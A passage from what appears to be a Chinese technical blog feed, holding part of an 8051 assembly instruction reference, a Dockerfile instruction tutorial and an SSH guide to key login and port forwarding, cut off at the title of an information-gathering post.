30H</td></tr><tr><td>8.【标号】END:指出源程序到此结束，汇编对其后的程序语句不予理睬。源程序只在主程序最后使用一个END。</td><td></td></tr></tbody></table><h5 id="七、指令集"><a href="#七、指令集" class="headerlink" title="七、指令集"></a>七、指令集</h5><p>指令集（111条）</p><h6 id="1、数据传送指令"><a href="#1、数据传送指令" class="headerlink" title="1、数据传送指令"></a>1、数据传送指令</h6><table><thead><tr><th>数据传送指令</th><th>（30条）</th></tr></thead><tbody><tr><td>MOV A,Rn</td><td>寄存器送 A</td></tr><tr><td>MOV A,data</td><td>直接字节送A</td></tr><tr><td>MOV A,@Ri</td><td>间接RAM送A</td></tr><tr><td>MOV A,#data</td><td>立接数送A</td></tr><tr><td>MOV Rn,A</td><td>A送寄存器</td></tr><tr><td>MOV Rn,data</td><td>直接数送寄存器</td></tr><tr><td>MOV Rn,#data</td><td>立即数送寄存器</td></tr><tr><td>MOV data,A</td><td>A送直接字节</td></tr><tr><td>MOV data,Rn</td><td>寄存器送直接字节</td></tr><tr><td>MOV data,data</td><td>直接字节送直接字节</td></tr><tr><td>MOV data,@R</td><td>间接Rn送直接字节</td></tr><tr><td>MOV data,#data</td><td>立即数送直接字节</td></tr><tr><td>MOV @Ri,A</td><td>A送间接Rn</td></tr><tr><td>MOV @Ri,data</td><td>直接字节送间接Rn</td></tr><tr><td>MOV @Ri,#data</td><td>立即数送间接Rn</td></tr><tr><td>MOV DPTR,#data16</td><td>16位常数送数据值针</td></tr><tr><td>MOV C,bit</td><td>直接位送进位位</td></tr><tr><td>MOV bit,C</td><td>进位位送直接位</td></tr><tr><td>MOVC A,@A+DPTR</td><td>A+DPTR 寻址程序存贮字节送A</td></tr><tr><td>MOVC A,@A+PC</td><td>A+PC 寻址程序存贮字节送A</td></tr><tr><td>MOVC A,@Ri</td><td>外部数据送A（8位地址）</td></tr><tr><td>MOVX A,@DPTR</td><td>外部数据送A(16位地址）</td></tr><tr><td>MOVX @Ri,A</td><td>A 送外部数据（8位地址）</td></tr><tr><td>MOVX @DPTR,A</td><td>A 送外部数据（16位地址）</td></tr><tr><td>PUSH data</td><td>直接字节进栈道，SP加1</td></tr><tr><td>POP data</td><td>直接字节出栈，SP减1</td></tr><tr><td>XCH A,Rn</td><td>寄存器与A交换</td></tr><tr><td>XCH A,data</td><td>直接字节与A交换</td></tr><tr><td>XCH A,@Ri</td><td>间接Rn与A交换</td></tr><tr><td>XCHD A,@Ri</td><td>间接Rn与A低半字节交换</td></tr></tbody></table><h6 id="2、逻辑运算指令"><a href="#2、逻辑运算指令" class="headerlink" title="2、逻辑运算指令"></a>2、逻辑运算指令</h6><table><thead><tr><th>逻辑运算指令</th><th>（35条）</th></tr></thead><tbody><tr><td>ANL A,Rn</td><td>寄存器于到A</td></tr><tr><td>ANL A,data</td><td>直接字节与到A</td></tr><tr><td>ANL A,@Ri</td><td>间接RAM与到A</td></tr><tr><td>ANL A,#data</td><td>立即数与到A</td></tr><tr><td>ANL data,A</td><td>A与到直接字节</td></tr><tr><td>ANL data,#data</td><td>立即数与到直接字节</td></tr><tr><td>ANL C,bit</td><td>直接位与到进位位</td></tr><tr><td>ANL C,/bit</td><td>直接位的反码与到进位位</td></tr><tr><td>ORL A,Rn</td><td>寄存器或到A</td></tr><tr><td>ORL A,data</td><td>直接字节或到A</td></tr><tr><td>ORL A,@Ri</td><td>间接RAM或到A</td></tr><tr><td>ORL A,#data</td><td>立即数或到A</td></tr><tr><td>ORL data，A</td><td>A或到直接字节</td></tr><tr><td>ORL data,#data</td><td>立即数或到直接字节</td></tr><tr><td>ORL C,bit</td><td>直接位或到进位位</td></tr><tr><td>ORL C,/bit</td><td>直接位的反码或到进位位</td></tr><tr><td>XRL A,Rn</td><td>寄存器异或到A</td></tr><tr><td>XRL A,data</td><td>直接字节异或到A</td></tr><tr><td>XRL A,@Ri</td><td>间接RAM异或到A</td></tr><tr><td>XRL A,#data</td><td>立即数异或到A</td></tr><tr><td>XRL data,#data</td><td>立即数或到直接字节</td></tr><tr><td>XRL data,A</td><td>A异或到直接字节</td></tr><tr><td>SETB C</td><td>进位置1</td></tr><tr><td>SETB bit</td><td>直接位置1</td></tr><tr><td>CLR A</td><td>A清0</td></tr><tr><td>CLR C</td><td>进位位清0</td></tr><tr><td>CLR bit</td><td>直接位清0</td></tr><tr><td>CPL A</td><td>A 求反码</td></tr><tr><td>CPL C</td><td>进位位取反</td></tr><tr><td>CPL bit</td><td>直接位取反</td></tr><tr><td>RL A</td><td>A循环左移一位</td></tr><tr><td>RLC A</td><td>A 带进位左移一位</td></tr><tr><td>RR A</td><td>A 右移一位</td></tr><tr><td>RRC A</td><td>A 带进位右移一位</td></tr><tr><td>SWAP A</td><td>A半字节交换</td></tr></tbody></table><h6 id="3、算术运算指令"><a href="#3、算术运算指令" class="headerlink" title="3、算术运算指令"></a>3、算术运算指令</h6><table><thead><tr><th>算术运算指令</th><th>（24条）</th></tr></thead><tbody><tr><td>ADD A,Rn</td><td>寄存器加到A</td></tr><tr><td>ADD A,data</td><td>直接字节加到A</td></tr><tr><td>ADD A,@Ri</td><td>间接RAM加到A</td></tr><tr><td>ADD A,#data</td><td>立即数加到A</td></tr><tr><td>ADDC A,Rn</td><td>寄存器带进位加到A</td></tr><tr><td>ADDC A,data</td><td>直接字节带进位加到A</td></tr><tr><td>ADDC A,@Ri</td><td>间接RAM带进位加到A</td></tr><tr><td>ADDC A,#data</td><td>立即数带进位加到A</td></tr><tr><td>SUBB A,Rn</td><td>从A中减去寄存器和进位</td></tr><tr><td>SUBB A,data</td><td>从A中减去直接字节和进位</td></tr><tr><td>SUBB A,#data</td><td>从A中减去立即数和进位</td></tr><tr><td>INC A</td><td>A加1</td></tr><tr><td>INC Rn</td><td>寄存器加1</td></tr><tr><td>INC data</td><td>直接字节加1</td></tr><tr><td>INC @Ri</td><td>间接RAM加1</td></tr><tr><td>INC DPTR</td><td>数据指针加1</td></tr><tr><td>DEC A</td><td>A减1</td></tr><tr><td>DEC Rn</td><td>寄存器减1</td></tr><tr><td>DEC data</td><td>直接字节减1</td></tr><tr><td>DEC @Ri</td><td>间接RAM减1</td></tr><tr><td>MUL AB</td><td>A乘B</td></tr><tr><td>DIV AB</td><td>A被B除</td></tr><tr><td>DA A</td><td>A十进制调整</td></tr></tbody></table><h6 id="4、转移指令"><a href="#4、转移指令" class="headerlink" title="4、转移指令"></a>4、转移指令</h6><table><thead><tr><th>转移指令</th><th>（22条）</th></tr></thead><tbody><tr><td>AJMP addr 11</td><td>绝对转移</td></tr><tr><td>LJMP addr 16</td><td>长转移</td></tr><tr><td>SJMP rel</td><td>短转移</td></tr><tr><td>JMP @A+DPTR</td><td>相对DPTR间接转移</td></tr><tr><td>JZ rel</td><td>若A=0则转移</td></tr><tr><td>JNZ rel</td><td>若A不等于0则转移</td></tr><tr><td>JC rel</td><td>若C=1则转移</td></tr><tr><td>JNC rel</td><td>若C不等于1则转移</td></tr><tr><td>JB bit,rel</td><td>若直接位=1则转移</td></tr><tr><td>JNB bit,rel</td><td>若直接位=0则转移</td></tr><tr><td>JBC bit,rel</td><td>若直接位=1则转移且清零</td></tr><tr><td>CJNE A,data,rel</td><td>直接数与A比较，不等转移</td></tr><tr><td>CJNE A,#data,rel</td><td>立即数与A比较，不等转移</td></tr><tr><td>CJNE @Ri,#data,rel</td><td>立即数与间接RAM比较，不等转移</td></tr><tr><td>CJNE Rn,#data,rel</td><td>立即数与寄存器比较，不等转移</td></tr><tr><td>DJNZ Rn,rel</td><td>寄存器减1不为0转移</td></tr><tr><td>DJNZ data,rel</td><td>直接字节减1不为0转移</td></tr><tr><td>ACALL addr 11</td><td>绝对子程序调用</td></tr><tr><td>LCALL addr 16</td><td>子程序调用</td></tr><tr><td>RET</td><td>子程序调用返回</td></tr><tr><td>RETI</td><td>中断程序调用返回</td></tr><tr><td>NOP</td><td>空操作</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编指令 </tag>
            
            <tag> 编程 </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerfile常用命令</title>
      <link href="/article/2021-09-03-dockerfile%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/article/2021-09-03-dockerfile%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><span id="more"></span><h6 id="1-FROM指令"><a href="#1-FROM指令" class="headerlink" title="1.FROM指令"></a>1.FROM指令</h6><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><h6 id="2-RUN指令"><a href="#2-RUN指令" class="headerlink" title="2.RUN指令"></a>2.RUN指令</h6><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p><p>shell 格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RUN &lt;命令行命令&gt;</span><br><span class="line"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span><br></pre></td></tr></table></figure><p>exec 格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</span><br><span class="line"># 例如：</span><br><span class="line"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span><br></pre></td></tr></table></figure><p>Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN yum install wget</span><br><span class="line">RUN wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span><br><span class="line">RUN tar -xvf redis.tar.gz</span><br><span class="line">以上执行会创建 3 层镜像。可简化为以下格式：</span><br><span class="line">FROM centos</span><br><span class="line">RUN yum install wget \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot; \</span><br><span class="line">    &amp;&amp; tar -xvf redis.tar.gz</span><br></pre></td></tr></table></figure><p>如上，以 <strong>&amp;&amp;</strong> 符号连接命令，这样执行后，只会创建 1 层镜像。</p><h6 id="3-COPY指令"><a href="#3-COPY指令" class="headerlink" title="3.COPY指令"></a>3.COPY指令</h6><p><strong>COPY</strong>：复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span><br><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,...  &quot;&lt;目标路径&gt;&quot;]</span><br></pre></td></tr></table></figure><p>**[–chown=<user>:<group>]**：可选参数，用户改变复制到容器内文件的拥有者和属组。</p><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY hom* /mydir/</span><br><span class="line">COPY hom?.txt /mydir/</span><br></pre></td></tr></table></figure><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p><h6 id="4-ADD指令"><a href="#4-ADD指令" class="headerlink" title="4.ADD指令"></a>4.ADD指令</h6><p><strong>ADD</strong>：ADD 指令和 COPY 的使用格类似（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p><ul><li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li><li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li></ul><h6 id="5-CMD指令"><a href="#5-CMD指令" class="headerlink" title="5.CMD指令"></a>5.CMD指令</h6><p><strong>CMD</strong>：类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p><ul><li>CMD 在docker run 时运行。</li><li>RUN 是在 docker build。</li></ul><p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMD &lt;shell 命令&gt; </span><br><span class="line">CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] </span><br><span class="line">CMD [&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]  # 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span><br></pre></td></tr></table></figure><p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p><h6 id="6-ENTRYPOINT指令"><a href="#6-ENTRYPOINT指令" class="headerlink" title="6.ENTRYPOINT指令"></a>6.ENTRYPOINT指令</h6><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p><p>但是, 如果运行 docker run 时使用了 –entrypoint 选项，将覆盖 CMD 指令指定的程序。</p><p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;&lt;executeable&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]</span><br></pre></td></tr></table></figure><p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p><p>示例：</p><p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [&quot;nginx&quot;, &quot;-c&quot;] # 定参</span><br><span class="line">CMD [&quot;/etc/nginx/nginx.conf&quot;] # 变参 </span><br></pre></td></tr></table></figure><p>1、不传参运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run  nginx:test</span><br></pre></td></tr></table></figure><p>容器内会默认运行以下命令，启动主进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -c /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>2、传参运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run  nginx:test -c /etc/nginx/new.conf</span><br></pre></td></tr></table></figure><p>容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -c /etc/nginx/new.conf</span><br></pre></td></tr></table></figure><h6 id="7-ENV指令"><a href="#7-ENV指令" class="headerlink" title="7.ENV指令"></a>7.ENV指令</h6><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;</span><br><span class="line">ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br></pre></td></tr></table></figure><p>以下示例设置 NODE_VERSION = 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ENV NODE_VERSION 7.2.0</span><br><span class="line"></span><br><span class="line">RUN curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot; \</span><br><span class="line">  &amp;&amp; curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot;</span><br></pre></td></tr></table></figure><h6 id="8-ARG指令"><a href="#8-ARG指令" class="headerlink" title="8.ARG指令"></a>8.ARG指令</h6><p>构建参数，与 ENV 作用一致。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p><p>构建命令 docker build 中可以用 –build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARG &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure><h6 id="9-VOLUME指令"><a href="#9-VOLUME指令" class="headerlink" title="9.VOLUME指令"></a>9.VOLUME指令</h6><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p><p>作用：</p><ul><li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li><li>避免容器不断变大。</li></ul><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</span><br><span class="line">VOLUME &lt;路径&gt;</span><br></pre></td></tr></table></figure><p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p><h6 id="10-EXPOSE指令"><a href="#10-EXPOSE指令" class="headerlink" title="10.EXPOSE指令"></a>10.EXPOSE指令</h6><p>仅仅只是声明端口。</p><p>作用：</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li></ul><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</span><br></pre></td></tr></table></figure><h6 id="11-WORKDIR指令"><a href="#11-WORKDIR指令" class="headerlink" title="11.WORKDIR指令"></a>11.WORKDIR指令</h6><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p><p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR &lt;工作目录路径&gt;</span><br></pre></td></tr></table></figure><h6 id="12-USER指令"><a href="#12-USER指令" class="headerlink" title="12.USER指令"></a>12.USER指令</h6><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure><h6 id="13-HEALTHCHECK指令"><a href="#13-HEALTHCHECK指令" class="headerlink" title="13.HEALTHCHECK指令"></a>13.HEALTHCHECK指令</h6><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEALTHCHECK [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令</span><br><span class="line">HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span><br><span class="line"></span><br><span class="line">HEALTHCHECK [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。</span><br></pre></td></tr></table></figure><h6 id="14-ONBUILD指令"><a href="#14-ONBUILD指令" class="headerlink" title="14.ONBUILD指令"></a>14.ONBUILD指令</h6><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这时执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ONBUILD &lt;其它指令&gt;</span><br></pre></td></tr></table></figure><h6 id="15-LABEL指令"><a href="#15-LABEL指令" class="headerlink" title="15.LABEL指令"></a>15.LABEL指令</h6><p>LABEL 指令用来给镜像添加一些元数据（metadata），以键值对的形式，语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span><br></pre></td></tr></table></figure><p>比如我们可以添加镜像的作者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL org.opencontainers.image.authors=&quot;runoob&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH常用操作</title>
      <link href="/article/2021-08-24-SSH%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
      <url>/article/2021-08-24-SSH%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>本文章主要描述的SSH常用操作。</p><span id="more"></span><h3 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h3><p><strong><code>-p</code>指定主机的端口</strong>  </p><p><code>$ ssh -p port user@host</code></p><p><strong>默认端口为22</strong></p><p><code>$ ssh user@host</code></p><p><strong>默认使用本机用户名</strong></p><p><code>$ ssh host</code></p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><ol><li><p>远程主机接收到用户的登陆请求，把自己的公钥发给用户</p></li><li><p>用户使用这个公钥，将密码加密后发回来</p></li><li><p>远程主机用自己的私钥，解密登陆密码，如果密码正确，就同意用户登陆</p></li></ol><blockquote><p>此处如果有攻击者截取了用户请求，再将自己的公钥发送给用户，然后就可以用自己的私钥解密出用户的私密信息，这就是<code>中间人攻击</code></p><p>应对的方法：用户首次连接远程主机时，远程主机将发送一段128位长的公钥指纹，用户需要自行与远程主机网站发布的公钥指纹进行对比以判断真伪，当用户信任了此公钥后，它将被保存在<code>$HOME/.ssh/known_hosts</code>中，下次连接时无需再次确认。</p></blockquote><br><h3 id="公钥登陆"><a href="#公钥登陆" class="headerlink" title="公钥登陆"></a>公钥登陆</h3><p>原理：用户将自己的<code>公钥</code>保存在远程主机上，登录时，远程主机向用户发送一段随机码，用户用自己的<code>私钥</code>签名后，在发回远程主机，远程主机用实现保存的<code>公钥</code>进行验证，如果成功，表示用户的身份正确，无需输入密码</p><ol><li><p>用户生成一对自己的密钥</p></li><li><p>将用户的<code>公钥</code>内容添加到 <code>$HOME/.ssh/authorized_keys</code>中（可以用<code>ssh-copy-id user@host</code>进行该操作）</p></li><li><p>重启ssh服务 <code>/etc/init.d/ssh restart</code></p></li></ol><blockquote><p>公钥登陆相关配置 /etc/ssh/sshd_config</p><p>RSAAuthentication yes</p><p>PubkeyAuthentication yes</p><p>AuthorizedKeysFile .ssh/authorized_keys</p></blockquote><h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><ol><li><p>直接操作 <code>$ ssh user@host command</code></p></li><li><p>用户和远程主机之间，建立命令和数据的传输通道</p></li></ol><blockquote><p>将当前目录下的src文件，复制到远程主机的$HOME目录</p><p><code>$ tar czv src | ssh user@host &quot;tar xz&quot;</code></p><p>将远程主机$HOME目录下面的src文件，复制到用户的当前目录</p><p><code>$ ssh user@host &quot;tar cz src&quot; | tar xzv</code></p></blockquote><h3 id="绑定本地端口"><a href="#绑定本地端口" class="headerlink" title="绑定本地端口"></a>绑定本地端口</h3><p><code>ssh -D port user@host</code></p><p><code>-D</code> 指定与远程host建立隧道的本地端口</p><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>假定<code>localhost</code>是本地主机，<code>remotehost</code>是远程主机，这两台主机之间无法连通。但是，另外还有一台<code>boardhost</code>，可以同时与前面两台主机互连。</p><p>在本机键入如下命令</p><p><code>$ ssh -L localPort:remotehost:remotePort boardhost</code></p><p><code>L</code>参数一共接受三个值，分别是”<code>本地端口:目标主机:目标主机端口</code>“</p><p>该命令的意思是指定SSH绑定本地端口<code>localPort</code>，然后指定<code>boardhost</code>将所有的数据，转发到目标主机<code>remotehost</code>的<code>remotePort</code>端口</p><blockquote><p>remotehost是boardhost 的相对地址(或绝对地址)，因为数据其实是由boardhost 传输到remotehost中的，与localhost无关</p></blockquote><p>这样一来<code>localhost</code>与<code>remotehost</code>之间将形成私密隧道，访问<code>localPort</code>就等于访问<code>remotePort</code></p><h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>假定<code>hostA</code>是本地主机，<code>hostB</code>是远程主机，这两台主机之间无法连通，而且，<code>boardhost</code>是一台内网主机，即<code>boardhost</code>可以访问<code>hostA</code>，但是<code>hostA</code>无法访问<code>boardhost</code></p><p>在<code>boardhost</code>键入如下命令</p><p><code>$ ssh -R portA:hostB:portB hostA</code></p><p><code>R</code>参数也是接受三个值，分别是”<code>远程主机端口:目标主机:目标主机端口</code>“。这条命令的意思，就是让<code>hostA</code>监听它自己的<code>portA</code>端口，然后将所有数据经由<code>boardhost</code>，转发到<code>hostB</code>的<code>portB</code>端口。</p><p>对<code>boardhost</code>来说<code>hostA</code>是远程机器，在<code>boardhost</code>机器上指定<code>hostA</code>监听某个端口，称为远程端口转发</p><blockquote><p>远程端口转发的前提条件是，<code>hostA</code>和<code>boardhost</code>两台主机都有sshd和ssh客户端，其原理就是：一开始由<code>hostA</code>充当<code>Server</code>，<code>boardhost</code>充当<code>Client</code>，<code>boardhost</code>发起请求建立一个连接；连接建立完成后，<code>hostA</code>就可以使用这个连接将充当<code>Clinet</code>，将数据转发至<code>boardhost</code>充当的<code>Server</code>；<code>boardhost</code>接收到数据后又需要充当<code>Client</code>将数据转发到<code>hostB</code></p></blockquote><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p><code>N</code>参数，表示只连接远程主机，不打开远程shell；</p><p><code>T</code>参数，表示不为这个连接分配TTY。</p><p>这个两个参数可以放在一起用，代表这个SSH连接只用来传数据，不执行远程操作。</p><p><code>$ ssh -NT -D port user@host</code></p><p><code>f</code>参数，表示SSH连接成功后，转入后台运行。这样一来，就可以在不中断SSH连接的情况下，在本地shell中执行其他操作。</p><p><code>$ ssh -f -D port user@host</code></p><p>要关闭这个后台连接，就只有用kill命令去杀掉进程。</p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> tool </tag>
            
            <tag> SSH </tag>
            
            <tag> Window </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python信息收集(子域名+邮箱)</title>
      <link href="/article/2021-08-24-python%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E5%AD%90%E5%9F%9F%E5%90%8D+%E9%82%AE%E7%AE%B1)/"/>
      <url>/article/2021-08-24-python%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E5%AD%90%E5%9F%9F%E5%90%8D+%E9%82%AE%E7%AE%B1)/</url>
      
